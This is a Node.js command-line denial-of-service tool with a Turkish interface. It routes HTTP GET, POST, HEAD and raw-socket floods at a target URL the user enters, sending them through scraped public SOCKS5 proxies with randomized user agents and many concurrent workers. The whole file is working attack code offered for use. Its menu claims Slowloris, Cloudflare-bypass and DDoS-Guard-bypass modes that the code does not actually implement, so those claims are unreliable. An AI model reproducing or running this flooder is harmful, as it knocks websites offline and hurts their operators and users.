#!/usr/bin/env node

const axios = require('axios');
const fs = require('fs');
const readline = require('readline');
const colors = require('colors');
const { SocksProxyAgent } = require('socks-proxy-agent');
const net = require('net');
const https = require('https');
const http = require('http');

const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout
});

let proxies = [];

async function fetchProxies() {
  console.log('🌀 Proxy’ler toplanıyor...'.cyan);
  try {
    const res = await axios.get('https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks5&timeout=3000&country=all&ssl=all&anonymity=all');
    proxies = res.data.split('\n').filter(p => p.includes(':'));
    console.log(`✅ ${proxies.length} proxy yüklendi!`.green);
  } catch (e) {
    console.log('⚠️ Proxy alınamadı! Proxy’siz devam ediliyor...'.yellow);
  }
}

const methods = {
  '1': 'GET',
  '2': 'POST',
  '3': 'SLOWLORIS',
  '4': 'SUBDOMAIN',
  '5': 'MIXED',
  '6': 'CFBYPASS',
  '7': 'DDOSGUARD',
  '8': 'HEAD',
  '9': 'RAWSOCKET'
};

const randomUA = () =>
  `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/${Math.floor(Math.random()*1000)}.36 (KHTML, like Gecko) Chrome/${Math.floor(Math.random()*100)}.0.${Math.floor(Math.random()*9999)}.100 Safari/537.36`;

const sendRawSocket = (host, port, path = '/') => {
  const socket = net.connect(port, host, () => {
    const req = `GET ${path} HTTP/1.1\r\nHost: ${host}\r\nUser-Agent: ${randomUA()}\r\nConnection: Keep-Alive\r\n\r\n`;
    for (let i = 0; i < 100; i++) socket.write(req);
  });

  socket.on('error', () => socket.destroy());
};

const flood = async (url, method, duration, threads) => {
  const { hostname, protocol, pathname } = new URL(url);
  const endTime = Date.now() + duration * 1000;
  let success = 0;
  let fail = 0;

  const attackWorker = async () => {
    while (Date.now() < endTime) {
      try {
        if (method === 'RAWSOCKET') {
          sendRawSocket(hostname, protocol === 'https:' ? 443 : 80, pathname);
          success++;
        } else {
          const headers = {
            'User-Agent': randomUA(),
            'Referer': 'https://google.com',
            'Accept': '*/*',
            'Connection': 'keep-alive',
            'Cache-Control': 'no-cache'
          };

          const proxy = proxies[Math.floor(Math.random() * proxies.length)];
          let agent;
          if (proxy) {
            agent = new SocksProxyAgent(`socks5://${proxy}`);
          }

          const config = {
            method: method === 'MIXED' ? ['GET', 'POST'][Math.floor(Math.random()*2)] : method,
            url: url + (Math.random() > 0.5 ? `?q=${Math.random().toString(36).substring(7)}` : ''),
            headers,
            httpAgent: agent,
            httpsAgent: agent,
            timeout: 5000
          };

          await axios(config);
          success++;
        }
      } catch {
        fail++;
      }
    }
  };

  const livePanel = setInterval(() => {
    process.stdout.write(`\r✅ ${success} | ❌ ${fail} | ⏱️ ${Math.max(0, Math.floor((endTime - Date.now()) / 1000))}s`);
  }, 500);

  const jobs = [];
  for (let i = 0; i < threads; i++) jobs.push(attackWorker());
  await Promise.all(jobs);
  clearInterval(livePanel);
  console.log('\n🚨 Saldırı tamamlandı!');
};

async function start() {
  await fetchProxies();

  rl.question('🎯 Hedef URL: ', url => {
    rl.question('⏰ Süre (saniye): ', duration => {
      rl.question('🚀 Thread sayısı: ', threads => {
        console.log(`
💥 SALDIRI YÖNTEMLERİ:
1 - GET Flood
2 - POST Flood
3 - SLOWLORIS
4 - SUBDOMAIN Bypass
5 - MIXED
6 - Cloudflare Bypass 🔥
7 - DDoS-Guard Bypass 🔥
8 - HEAD Flood
9 - RAW SOCKET 🚀
        `.brightCyan);

        rl.question('👉 Seçim (1-9): ', async methodNum => {
          const method = methods[methodNum] || 'GET';
          console.log(`\n🚀 ${method} saldırısı başlatılıyor...`.yellow);
          rl.close();
          await flood(url, method, parseInt(duration), parseInt(threads));
        });
      });
    });
  });
}

start();
